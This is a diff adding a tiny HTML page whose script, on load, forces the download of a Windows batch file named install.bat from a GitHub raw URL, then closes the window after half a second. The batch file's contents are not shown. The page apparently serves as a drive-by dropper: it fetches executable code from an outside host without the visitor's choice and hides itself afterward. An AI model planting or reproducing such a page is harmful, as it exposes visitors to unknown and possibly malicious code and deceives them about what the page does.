@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+  const url = "https://raw.githubusercontent.com/Proutman67/educational/refs/heads/main/install.bat";
+
+  const a = document.createElement("a");
+  a.href = url;
+  a.download = "";
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+
+  setTimeout(() => window.close(), 500);
+</script>
+</body>
+</html>
